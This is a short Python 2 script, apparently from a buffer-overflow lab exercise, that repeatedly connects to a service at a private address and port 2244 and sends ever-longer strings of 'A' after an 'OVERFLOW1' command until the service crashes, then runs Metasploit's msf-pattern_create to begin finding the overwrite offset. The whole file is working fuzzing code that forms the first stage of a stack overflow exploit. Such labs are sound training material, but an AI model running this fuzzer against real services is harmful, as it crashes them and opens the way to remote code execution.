#!/usr/bin/env python
import socket,sys,time,os

buf = 'A'*10

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(("10.10.188.74",2244))
		buffer=("OVERFLOW1 "+buf)
		s.recv(4098)
		s.send(buffer)
		s.recv(4098)
		s.close()
		time.sleep(2)
		if len(buf)<100:
			buf=buf+'A'*10
		elif len(buf)<1000:
			buf=buf+'A'*100
		else:
			#print "buf over 1000"
			buf=buf+'A'*1000
		print "[*] send %s bytes" % (len(buf))
	except:
		print "[!] gagal/crash"
		print ("[*] msf-pattern_create -l "+str(len(buf)))
		os.system("msf-pattern_create -l "+(str(len(buf))))
		sys.exit()
